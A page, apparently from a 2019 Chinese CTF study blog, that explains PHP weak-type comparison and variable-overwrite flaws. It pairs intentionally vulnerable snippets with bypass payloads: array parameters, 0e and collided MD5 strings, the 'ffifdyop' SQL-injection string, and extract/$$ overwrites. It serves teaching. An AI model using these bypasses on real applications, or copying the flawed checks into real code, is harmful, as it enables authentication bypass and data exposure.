@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    PHP代码审计 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-oxci5k" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      PHP代码审计
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/11/10/oxci5k/" class="article-date">
+  <time datetime="2019-11-10T05:35:41.000Z" itemprop="datePublished">2019-11-10</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><p>字符串与数值做比较，会先把字符串转换成数值</p>
+<p>$a==$b  意思是，如果不同类型，经过类型转换后，$a与$b 相等</p>
+<p>$a===$b  类型也要相等，全等于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>==<span class="number">0</span>==<span class="keyword">false</span></span><br><span class="line"><span class="string">'123'</span>==<span class="number">123</span></span><br><span class="line"><span class="string">'abc'</span>==<span class="number">0</span></span><br><span class="line"><span class="string">'123a'</span>==<span class="number">123</span></span><br><span class="line"><span class="number">0x01</span>==<span class="number">1</span></span><br><span class="line"><span class="string">'0e123456789'</span>=<span class="string">'0e987654321'</span></span><br><span class="line">[<span class="keyword">false</span>]==[<span class="number">0</span>]==[<span class="keyword">NULL</span>]==[<span class="string">''</span>]</span><br><span class="line"><span class="keyword">NULL</span>==<span class="keyword">false</span>==<span class="number">0</span></span><br><span class="line"><span class="keyword">true</span>==<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MD5-比较"><a href="#MD5-比较" class="headerlink" title="MD5 比较"></a>MD5 比较</h2><p>PHP 在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么 PHP 将会认为他们相同，都是 0<br>md5(strings,true)，如果是 true 就返回十六进制的值</p>
+<p><strong>第一级</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_error"</span>,<span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])==md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"flag&#123;hello_smart_hacker&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You're a fool"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>比较 post 数据，不能相等，数据类型转化后是相等的就行</p>
+<p><strong>利用</strong></p>
+<p>md5 弱比较，为 0e 开头的会被识别为科学记数法，结果均为 0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565490748380-1fcee1ff-9d25-4406-8abf-7752542a49b5.png#align=left&display=inline&height=222&name=image.png&originHeight=289&originWidth=501&size=23167&status=done&style=none&width=384.7679882578129" alt="image.png"><br>MD5 相同：</p>
+<ul>
+<li>QNKCDZO</li>
+<li>240610708</li>
+<li>s878926199a</li>
+<li>s155964671a</li>
+<li>s214587387a</li>
+<li>s214587387a</li>
+</ul>
+<p><strong>第二级</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_error"</span>,<span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"flag&#123;hello_smart_hacker&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You're a fool"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>比上一级多了个=，会检查类型</p>
+<p><strong>利用</strong></p>
+<p>md5 强比较，没有规定字符串如果这个时候传入的是数组不是字符串，md5（）函数无法解出其数值并且不会报错，就会得到数值相等；</p>
+<p>param1[]=111&amp;param2[]=222</p>
+<p><strong>第三级</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_error"</span>,<span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"flag&#123;hello_smart_hacker&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You're a fool"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>区别在于，前面检查的是完全不相等，问题在于如果传递的值不相等，他还是不相等，所以直接用上一个的 payload</p>
+<p><strong>利用</strong></p>
+<p>param1[]=111&amp;param2[]=222</p>
+<p><strong>第四级</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_error"</span>,<span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"flag&#123;hello_smart_hacker&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You're a fool"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>真实 md5 碰撞，因为此时不能输入数组了，只能输入字符串</p>
+<p><strong>利用</strong></p>
+<p>强 MD5 碰撞，fastcoll.exe<a href="https://www.yuque.com/attachments/yuque/0/2019/zip/268938/1565528089921-a8ae2c72-1fe0-44c4-8dd4-5896a83dcc4a.zip?_lake_card=%7B%22uid%22%3A%22rc-upload-1565522818281-6%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Fzip%2F268938%2F1565528089921-a8ae2c72-1fe0-44c4-8dd4-5896a83dcc4a.zip%22%2C%22name%22%3A%22fastcoll%EF%BC%88MD5%E5%BC%BA%E7%A2%B0%E6%92%9E%EF%BC%89.zip%22%2C%22size%22%3A112660%2C%22type%22%3A%22application%2Fx-zip-compressed%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22yJTJw%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">fastcoll（MD5 强碰撞）.zip</a></p>
+<p>当期目录下新建一个 0.txt 文件，使用下面的命令，生成 MD5 相同的 1.txt 和 2.txt<br>命令行使用：<br>fastcoll.exe -p 0.txt -o 1.txt 2.txt<br><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528053120-f73633fd-e52c-4489-8ce6-d685093c6bbd.png#align=left&display=inline&height=184&name=image.png&originHeight=239&originWidth=792&size=34005&status=done&style=none&width=608.2559814375006" alt="image.png"></p>
+<p>可以直接 POST 传文件</p>
+<p>还可以用 Python 来把数据提出来：二进制字符串-&gt;二进制流-&gt;16 进制-&gt;url 编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">a=parse.quote(open(<span class="string">'1.txt'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528704288-0111f51e-bc1f-4bb8-86b4-f8d4c886defe.png#align=left&display=inline&height=280&name=image.png&originHeight=364&originWidth=1067&size=81924&status=done&style=none&width=819.4559749921883" alt="image.png"></p>
+<p>传参：</p>
+<blockquote>
+<p>param1=f%A8%9D%B3%8D%FD%CA-%9ElX%E8%C4%95%03%FC%BE%89%D7%EA%20%3CS%FB/f7e%0A%900%08%15%CE%C3%F2%E0%E5U%0Eo%06W%DC%913%99%A2%97%9D-F<del>%25%BE%A3%09%A5%C4%3Bj%D8kb%18%0E%01MK%A7%E1%19%DDD%2CL%DDJ%DA%22%84%CCj0%09f%26%E1%C9%1Av%BD%ECG%FE%E9Ne%9E%9B%F4%0E%E8%10%88bU7%D2%E4%D5%E8P8%B1z%13%2C%82%F8%8D%1B%3Fk%AF%BC3%05<br>&amp;param2=f%A8%9D%B3%8D%FD%CA-%9ElX%E8%C4%95%03%FC%BE%89%D7j%20%3CS%FB/f7e%0A%900%08%15%CE%C3%F2%E0%E5U%0Eo%06W%DC%91%B3%99%A2%97%9D-F</del>%25%BE%A3%09%A5%C4%BBj%D8kb%18%0E%01MK%A7%E1%19%DDD%2CL%DDJ%DA%22%84%CCj%B0%09f%26%E1%C9%1Av%BD%ECG%FE%E9Ne%9E%9B%F4%0E%E8%10%88bU7%D2d%D5%E8P8%B1z%13%2C%82%F8%8D%1B%3F%EB%AF%BC3%05</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528805731-25799f6b-6782-44b7-9bdc-d4c59b770188.png#align=left&display=inline&height=289&name=image.png&originHeight=376&originWidth=1399&size=94884&status=done&style=none&width=1074.4319672109384" alt="image.png"></p>
+<h2 id="SHA1-比较"><a href="#SHA1-比较" class="headerlink" title="SHA1 比较"></a>SHA1 比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_error"</span>,<span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])<span class="keyword">and</span> <span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(sha1($_GET[<span class="string">'name'</span>])===sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Flag：'</span>.flag);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>发现返回值还是 string，所以还是可以用数组让他出错</p>
+<p><a href="http://127.0.0.1/php/type/sha1.php?name%5B%5D=1&password%5B%5D=" target="_blank" rel="noopener">http://127.0.0.1/php/type/sha1.php?name[]=1&amp;password[]=</a><br>就可以</p>
+<h2 id="MD5-结合-Sqli"><a href="#MD5-结合-Sqli" class="headerlink" title="MD5 结合 Sqli"></a>MD5 结合 Sqli</h2><p>这个字符串：ffifdyop，经过 md5 后会变成：<code>&#39;or&#39;6�]��!r,��b</code></p>
+<p>然后’ or ‘就成功绕过，真的是太巧了</p>
+<p>实验吧的题目：<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p>
+<p>参考：<a href="https://blog.csdn.net/sinat_41380394/article/details/81490193" target="_blank" rel="noopener">https://blog.csdn.net/sinat_41380394/article/details/81490193</a></p>
+<h2 id="JSON-相关"><a href="#JSON-相关" class="headerlink" title="JSON 相关"></a>JSON 相关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;welcome_to_json_world!&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>]))&#123;</span><br><span class="line">	$message=json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">	<span class="keyword">if</span>($message-&gt;key == $key)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"fail"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"=_=!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>经过 json 编码后与$key 进行比较，但是我们并不知道 key 的值</p>
+<p><strong>json_decode 相关知识</strong></p>
+<p><a href="https://www.php.net/manual/zh/function.json-decode.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.json-decode.php</a></p>
+<p><strong>利用</strong></p>
+<p>字符串与 0 做比较会相等，传 message={“key”:0}</p>
+<h2 id="switch-相关"><a href="#switch-相关" class="headerlink" title="switch 相关"></a>switch 相关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=$_POST[<span class="string">'key'</span>];</span><br><span class="line"><span class="keyword">switch</span>($key)&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"this is two"</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"flag&#123;hello_world&#125;"</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当$key是字符串时，跟下面比较会强制转换为int型，switch使用的是==格式，只要$key 开头是 3 就可以</p>
+<h2 id="strcmp-相关"><a href="#strcmp-相关" class="headerlink" title="strcmp 相关"></a>strcmp 相关</h2><p>转换成 ascii 后逐字节进行比较<br>返回相当于前面的减去后面的值<br>strcmp(‘ab’,’aa’)    返回的是 1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;welcome_to_strcmp_world!&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> (strcmp($_POST[<span class="string">'message'</span>],$password)==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"right!!!"</span>;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"fail"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传一个数组就可以得到 flag</p>
+<h2 id="in-array-相关"><a href="#in-array-相关" class="headerlink" title="in_array 相关"></a>in_array 相关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">'3'</span>];</span><br><span class="line">var_dump(in_array(<span class="string">'abc'</span>, $array));</span><br><span class="line">var_dump(in_array(<span class="string">'1bc'</span>, $array));</span><br><span class="line">var_dump(in_array(<span class="string">'3'</span>, $array));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：bool(true) bool(true) bool(true)</span></span><br></pre></td></tr></table></figure>
+
+<p>检查是否在数组中，但是还是弱类型，说所以’abc’与 0 是一样的</p>
+<h2 id="array-search-相关"><a href="#array-search-相关" class="headerlink" title="array_search 相关"></a>array_search 相关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">'3'</span>];</span><br><span class="line">var_dump(array_search(<span class="string">'abc'</span>, $array));</span><br><span class="line">var_dump(array_search(<span class="string">'1bc'</span>, $array));</span><br><span class="line">var_dump(array_search(<span class="number">3</span>, $array));</span><br><span class="line">var_dump(array_search(<span class="string">'3'</span>, $array));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：int(0) int(1) int(3) int(3)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>例题</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;welcome_to_array_world!&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">	$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">	<span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	$test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">'admin'</span>,$test)===<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"=_=!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传参：test[]=0</p>
+<h2 id="strpos-相关"><a href="#strpos-相关" class="headerlink" title="strpos 相关"></a>strpos 相关</h2><p>查找字符串首次出现的位置</p>
+<p>strpos(‘abc’,’a’)</p>
+<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$trueflag=<span class="string">"flag&#123;11111_22_4232&#125;"</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($gift))&#123;</span><br><span class="line">$content = trim(file_get_contents($flag));</span><br><span class="line">	<span class="keyword">if</span>($gift==$content)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $trueflag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"emm..."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="http://127.0.0.1/php/variable/extract.php?gift=&flag=" target="_blank" rel="noopener">http://127.0.0.1/php/variable/extract.php?gift=&amp;flag=</a></p>
+<h2 id=""><a href="#" class="headerlink" title="$$"></a>$$</h2><p>遍历初始化变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	$$key =$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果传递的参数是 a=123，那么 GET 得到的是是 a=123，把$key的值给$value，意思就是$value=123<br>$key 是 a，那么$$key就是$a</p>
+<p><strong>例题</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line">$flag = <span class="string">"flag&#123;hello_hacker&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>]!=<span class="string">"POST"</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"AEUCTF is here :p..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">	$$key = $$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">	$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">"flag"</span>]!==$flag)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag: "</span>.$flag.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>get 传参_200=flag<br>post 传参 flag=111</p>
